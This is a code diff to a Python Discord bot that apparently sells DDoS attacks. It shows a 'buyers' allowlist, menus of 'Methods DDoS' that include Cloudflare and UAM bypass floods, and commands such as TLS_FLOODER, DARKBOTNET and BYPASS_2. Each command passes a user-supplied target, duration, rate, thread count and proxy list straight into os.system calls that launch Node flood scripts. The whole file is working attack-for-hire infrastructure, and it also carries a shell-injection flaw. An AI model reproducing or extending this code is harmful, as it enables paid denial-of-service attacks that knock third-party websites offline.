@@ -136,7 +136,7 @@ async def help(ctx):
 		embed.add_field(name="**Bot_info**", value="`View Bot Information`")
 		embed.add_field(name="**Ping**", value="`Ping Website Status`")
 		embed.add_field(name="**Methods**", value="`Show All Methods DDoS`")
-		embed.add_field(name="**Commands**",value="`Show All Commands To DDoS`")
+		embed.add_field(name="**Commands**", value="`Show All Commands To DDoS`")
 		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}")
 		
 		await ctx.send(embed=embed)
@@ -236,8 +236,8 @@ async def Methods(ctx):
 		await ctx.reply(embed=embedc)
 	else:
 		embet = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embet.add_field(name="**Methods Layer4**", value="```\nTCP_KILL\nTCP\n```")
-		embet.add_field(name="**Methods Layer7**", value="```\nSLOW\nHYPER\nUAM\nUAM-BYPASS\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKETS\nIO-STRESSER\nCLOUDFLARE\nCF-BYPASS\nTCP_KILL\nCOFZ_TLS\nTLS_BYPASS\nHTTP_CONNECT\n```")
+		embet.add_field(name="**Methods Layer4**", value="```\nTCP_KILL\n```")
+		embet.add_field(name="**Methods Layer7**", value="```\nTCP_KILL\nCOFZ_TLS\nTLS_BYPASS\nHTTP_CONNECT\nTLS_FLOODER\nTLS_V2\nDARKBOTNET\nBYPASS_2\nBOT\n```")
 		embet.set_footer(text=f"~>© Owner : CofZZ & Asep | All Methods Show")
 		
 		await ctx.channel.send(embed=embet)
@@ -256,11 +256,10 @@ async def Proxy(ctx):
 		await ctx.reply(embed=embedc)
 	else:
 		embet = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embet.add_field(name="**Proxy**", value="```alive2.txt, alive1.txt, proxy.txt```")
+		embet.add_field(name="**Proxy**", value="```alive2.txt, alive1.txt, sux.txt```")
 		embet.set_footer(text=f"~>© Owner : CofZZ & Asep | All Proxy Show")
 		
 		await ctx.channel.send(embed=embet)
-	
 	
 	
 	
@@ -279,297 +278,20 @@ async def Commands(ctx):
 		embed.set_thumbnail(url="https://media2.giphy.com/media/F2U5dFf4LG1zYmnJS2/giphy.gif")
 		embed.add_field(name="**PROXY**", value="```.Proxy```")
 		embed.add_field(name="**TCP_KILL**", value="```.TCP_KILL [url/ip] [time] [port]```")
-		embed.add_field(name="**TCP**", value="```.TCP [ip] [port] [packet] [time]```")
-		embed.add_field(name="**SLOW**", value="```.SLOW [url] [time]```")
-		embed.add_field(name="**HYPER**", value="```.HYPER [url] [time]```")
-		embed.add_field(name="**UAM**", value="```.UAM [url] [thread] [time] [raw/proxy]```")
-		embed.add_field(name="**UAM-BYPASS**", value="```.UAM_BYPASS [url] [time] [request/id]```")
-		embed.add_field(name="**HTTP-RAW**", value="```.HTTP_RAW [url] [time]```")
-		embed.add_field(name="**HTTP-RAND**", value="```.HTTP_RAND [url] [time]```")
-		embed.add_field(name="**HTTP-SOCKETS**", value="```.HTTP_SOCKETS [url] [request/ip] [time]```")
-		embed.add_field(name="**IO-STRESSER**", value="```.IO_STRESSER [url] [time] [thread]```")
-		embed.add_field(name="**CLOUDFLARE**", value="```.CF [url] [time] [thread]```")
-		embed.add_field(name="**CF-BYPASS**", value="```.CF_BYPASS [url] [thread<50] [time]```")
 		embed.add_field(name="**COFZ_TLS**", value="```.COFZ_TLS [url] [time] [rate] [thread] [proxy]```")
 		embed.add_field(name="**TLS_BYPASS**", value="```.TLS_BYPASS [url] [time] [rate] [thread]```")
 		embed.add_field(name="**HTTP_CONNECT**", value="```.HTTP_CONNECT [url] [port] [connect 1 - 9999]  [thread] [time]```")
+		embed.add_field(name="**TLS_FLOODER**", value="```.TLS-FLOODER [url] [time] [rate] [thread] [proxy]```")
+		embed.add_field(name="**TLS_V2**", value="```.TLS_V2 [url] [time] [rate] [thread] [proxy]```")
+		embed.add_field(name="**DARKBOTNET**", value="```.DARKBOTNET [url] [time] [rate] [thread] [proxy]```")
+		embed.add_field(name="**BYPASS_2**", value="```.BYPASS_2 [url] [time] [rate] [thread] [proxy]```")
+		embed.add_field(name="**BOT**", value="```.BOT [url] [time] [rate] [thread] [proxy]```")
 		embed.set_footer(text="~>© Owner : CofZZ & Asep | All Methods Command", icon_url=ctx.author.avatar)
 		
 		await ctx.send(embed=embed)
 		
 		
 		
-		
-		
-		
-		
-@bot.command()
-async def SLOW(ctx, url, time):
-	if ctx.author.id not in buyers:
-		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
-		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
-		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
-		await ctx.reply(embed=embedc)
-	else:
-		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
-		embed.add_field(name="**Target**", value=f"`{url}`")
-		embed.add_field(name="**Methods**", value="`HTTP-BYPASS`")
-		embed.add_field(name="**Duration**", value=f"`{time}`")
-		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
-		rdma1 = random.choice(ma1)
-		embed.set_image(url=rdma1)
-		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
-		
-		
-		await ctx.send(embed=embed)
-		
-		os.system(f"node slow.js {url} {time}")
-		
-		
-		
-		
-		
-		
-		
-@bot.command()
-async def HYPER(ctx, url, time):
-	if ctx.author.id not in buyers:
-		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
-		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
-		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
-		await ctx.reply(embed=embedc)
-	else:
-		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
-		embed.add_field(name="**Target**", value=f"`{url}`")
-		embed.add_field(name="**Methods**", value="`HYPER`")
-		embed.add_field(name="**Duration**", value=f"`{time}`")
-		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
-		rdma1 = random.choice(ma1)
-		embed.set_image(url=rdma1)
-		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
-		
-		
-		await ctx.send(embed=embed)
-		
-		os.system(f"node hyper.js {url} {time}")
-		
-		
-		
-		
-		
-		
-@bot.command()
-async def UAM(ctx, url, thread, time, prxy):
-	if ctx.author.id not in buyers:
-		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
-		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
-		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
-		await ctx.reply(embed=embedc)
-	else:
-		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
-		embed.add_field(name="**Target**", value=f"`{url}`")
-		embed.add_field(name="**Methods**", value="`UAM`")
-		embed.add_field(name="**Threads**", value=f"`{thread}`")
-		embed.add_field(name="**Duration**", value=f"`{time}`")
-		embed.add_field(name="**Proxy**", value=f"`{prxy}`")
-		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
-		rdma1 = random.choice(ma1)
-		embed.set_image(url=rdma1)
-		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
-		
-		
-		await ctx.send(embed=embed)
-		
-		
-		os.system(f"node ll.js {url} {thread} {time} {prxy}")
-		
-		
-		
-		
-		
-		
-@bot.command()
-async def UAM_BYPASS(ctx, url, time, req):
-	if ctx.author.id not in buyers:
-		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
-		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
-		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
-		await ctx.reply(embed=embedc)
-	else:
-		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
-		embed.add_field(name="**Target**", value=f"`{url}`")
-		embed.add_field(name="**Methods**", value="`UAM-BYPASS`")
-		embed.add_field(name="**Requests/ip**", value=f"`{req}")
-		embed.add_field(name="**Duration**", value=f"`{time}`")
-		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
-		rdma1 = random.choice(ma1)
-		embed.set_image(url=rdma1)
-		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
-		
-		
-		await ctx.send(embed=embed)
-		
-		os.system(f"node uam.js {url} {time} {req} alive2.txt")
-		
-		
-		
-@bot.command()
-async def HTTP_RAW(ctx, url, time):
-	if ctx.author.id not in buyers:
-		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
-		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
-		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
-		await ctx.reply(embed=embedc)
-	else:
-		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
-		embed.add_field(name="**Target**", value=f"`{url}`")
-		embed.add_field(name="**Methods**", value="`HTTP-RAW`")
-		embed.add_field(name="**Duration**", value=f"`{time}`")
-		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
-		rdma1 = random.choice(ma1)
-		embed.set_image(url=rdma1)
-		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
-		
-		await ctx.send(embed=embed)
-		
-		
-		os.system(f"node HTTP-RAW.js {url} {time}")
-		
-		
-		
-		
-@bot.command()
-async def HTTP_RAND(ctx, url, time):
-	if ctx.author.id not in buyers:
-		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
-		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
-		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
-		await ctx.reply(embed=embedc)
-	else:
-		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
-		embed.add_field(name="**Target**", value=f"`{url}`")
-		embed.add_field(name="**Methods**", value="`HTTP-RAND`")
-		embed.add_field(name="**Duration**", value=f"`{time}`")
-		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
-		rdma1 = random.choice(ma1)
-		embed.set_image(url=rdma1)
-		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
-		
-		await ctx.send(embed=embed)
-		
-		
-		os.system(f"node HTTP-RAND.js {url} {time}")
-		
-		
-		
-		
-@bot.command()
-async def HTTP_SOCKETS(ctx, url, req, time):
-	if ctx.author.id not in buyers:
-		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
-		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
-		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
-		await ctx.reply(embed=embedc)
-	else:
-		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
-		embed.add_field(name="**Target**", value=f"`{url}`")
-		embed.add_field(name="**Methods**", value="`HTTP-SOCKETS`")
-		embed.add_field(name="**Requests/ip**", value=f"`{req}`")
-		embed.add_field(name="**Duration**", value=f"`{time}`")
-		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
-		rdma1 = random.choice(ma1)
-		embed.set_image(url=rdma1)
-		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
-		
-		
-		await ctx.send(embed=embed)
-		
-		os.system(f"node HTTP-SOCKETS.js {url} {req} {time}")
-		
-		
-		
-		
-@bot.command()
-async def IO_STRESSER(ctx, url, time, thread, mthd):
-	if ctx.author.id not in buyers:
-		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
-		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
-		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
-		await ctx.reply(embed=embedc)
-	else:
-		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
-		embed.add_field(name="**Target**", value=f"`{url}`")
-		embed.add_field(name="**Methods**", value="`IO-STRESSER`")
-		embed.add_field(name="**Threads**", value=f"`{thread}")
-		embed.add_field(name="**Duration**", value=f"`{time}`")
-		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
-		rdma1 = random.choice(ma1)
-		embed.set_image(url=rdma1)
-		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
-		
-		
-		await ctx.send(embed=embed)
-		
-		os.system(f"node io-stresser.js {url} {time} {thread} {mthd}")
-		
-		
-		
-@bot.command()
-async def CF(ctx, url, time, thread):
-	if ctx.author.id not in buyers:
-		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
-		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
-		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
-		await ctx.reply(embed=embedc)
-	else:
-		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
-		embed.add_field(name="**Target**", value=f"`{url}`")
-		embed.add_field(name="**Methods**", value="`CLOUDFLARE`")
-		embed.add_field(name="**Threads**", value=f"`{thread}")
-		embed.add_field(name="**Duration** ", value=f"`{time}`")
-		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
-		rdma1 = random.choice(ma1)
-		embed.set_image(url=rdma1)
-		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
-		
-		
-		await ctx.send(embed=embed)
-		
-		os.system(f"node cf.js {url} {time} {thread}")
-		
-		
-@bot.command()
-async def CF_BYPASS(ctx, url, thread, time):
-	if ctx.author.id not in buyers:
-		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
-		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
-		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
-		await ctx.reply(embed=embedc)
-	else:
-		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
-		embed.add_field(name="**Target**", value=f"`{url}`")
-		embed.add_field(name="**Methods**", value="`CF-BYPASS`")
-		embed.add_field(name="**Threads**", value=f"`{thread}")
-		embed.add_field(name="**Duration**", value=f"`{time}`")
-		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
-		rdma1 = random.choice(ma1)
-		embed.set_image(url=rdma1)
-		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
-		
-		
-		await ctx.send(embed=embed)
-		
-		os.system(f"node bypasserr.js {url} {thread} {time}")
 		
 		
 @bot.command()
@@ -677,7 +399,7 @@ async def HTTP_CONNECT(ctx, url, port, connect, thread, time):
 		os.system(f"node HTTP-CONNECTv2.js {url} {port} {connect} {thread} {time}")
 				
 @bot.command()
-async def TCP(ctx, ip, port, packet, time):
+async def TLS_FLOODER(ctx, url, time, rate, thread, proxy):
 	if ctx.author.id not in buyers:
 		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
 		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
@@ -686,11 +408,12 @@ async def TCP(ctx, ip, port, packet, time):
 	else:
 		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
 		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
-		embed.add_field(name="**Target**", value=f"`{ip}`")
-		embed.add_field(name="**Methods**", value="`TCP`")
-		embed.add_field(name="**Port**", value=f"`{port}")
-		embed.add_field(name="**Packets**", value=f"`{packet}`")
-		embed.add_field(name="**Time**", value=f"`{time}`")
+		embed.add_field(name="**Target**", value=f"`{url}`")
+		embed.add_field(name="**Methods**", value="`TLS_FLOODER`")
+		embed.add_field(name="**Time**", value=f"`{time}")
+		embed.add_field(name="**Rate**", value=f"`{rate}`")
+		embed.add_field(name="**Thread**", value=f"`{thread}`")
+		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
 		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
 		rdma1 = random.choice(ma1)
 		embed.set_image(url=rdma1)
@@ -699,15 +422,115 @@ async def TCP(ctx, ip, port, packet, time):
 		
 		await ctx.send(embed=embed)
 		
-		os.system(f"node tcp.js {ip} {port} {packet} {time}")
+		os.system(f"node TLS-FLOODER.js {url} {time} {rate} {thread} {proxy}")
+					
+@bot.command()
+async def TLS_V2(ctx, url, time, rate, thread, proxy):
+	if ctx.author.id not in buyers:
+		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
+		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
+		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
+		await ctx.reply(embed=embedc)
+	else:
+		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
+		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
+		embed.add_field(name="**Target**", value=f"`{url}`")
+		embed.add_field(name="**Methods**", value="`TLS_V2`")
+		embed.add_field(name="**Time**", value=f"`{time}")
+		embed.add_field(name="**Rate**", value=f"`{rate}`")
+		embed.add_field(name="**Thread**", value=f"`{thread}`")
+		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
+		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
+		rdma1 = random.choice(ma1)
+		embed.set_image(url=rdma1)
+		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
+		
+		
+		await ctx.send(embed=embed)
+		
+		os.system(f"node TLS-V2.js {url} {time} {rate} {thread} {proxy}")
 					
 	
+@bot.command()
+async def BYPASS_2(ctx, url, time, rate, thread, proxy):
+	if ctx.author.id not in buyers:
+		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
+		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
+		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
+		await ctx.reply(embed=embedc)
+	else:
+		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
+		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
+		embed.add_field(name="**Target**", value=f"`{url}`")
+		embed.add_field(name="**Methods**", value="`BYPASS_2`")
+		embed.add_field(name="**Time**", value=f"`{time}")
+		embed.add_field(name="**Rate**", value=f"`{rate}`")
+		embed.add_field(name="**Thread**", value=f"`{thread}`")
+		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
+		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
+		rdma1 = random.choice(ma1)
+		embed.set_image(url=rdma1)
+		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
+		
+		
+		await ctx.send(embed=embed)
+		
+		os.system(f"node bypass_2.js {url} {time} {rate} {thread} {proxy}")
+						
 	
+@bot.command()
+async def DARKBOTNET(ctx, url, time, rate, thread, proxy):
+	if ctx.author.id not in buyers:
+		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
+		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
+		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
+		await ctx.reply(embed=embedc)
+	else:
+		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
+		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
+		embed.add_field(name="**Target**", value=f"`{url}`")
+		embed.add_field(name="**Methods**", value="`DARKBOTNET`")
+		embed.add_field(name="**Time**", value=f"`{time}")
+		embed.add_field(name="**Rate**", value=f"`{rate}`")
+		embed.add_field(name="**Thread**", value=f"`{thread}`")
+		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
+		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
+		rdma1 = random.choice(ma1)
+		embed.set_image(url=rdma1)
+		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
+		
+		
+		await ctx.send(embed=embed)
+		
+		os.system(f"node DarkBotnet.js {url} {time} {rate} {thread} {proxy}")
+						
 	
-	
-	
-	
-	
+@bot.command()
+async def BOT(ctx, url, time, rate, thread, proxy):
+	if ctx.author.id not in buyers:
+		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
+		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
+		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
+		await ctx.reply(embed=embedc)
+	else:
+		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
+		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
+		embed.add_field(name="**Target**", value=f"`{url}`")
+		embed.add_field(name="**Methods**", value="`BOT`")
+		embed.add_field(name="**Time**", value=f"`{time}")
+		embed.add_field(name="**Rate**", value=f"`{rate}`")
+		embed.add_field(name="**Thread**", value=f"`{thread}`")
+		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
+		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
+		rdma1 = random.choice(ma1)
+		embed.set_image(url=rdma1)
+		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
+		
+		
+		await ctx.send(embed=embed)
+		
+		os.system(f"node BOT.js {url} {time} {rate} {thread} {proxy}")
+							
 	
 	
 
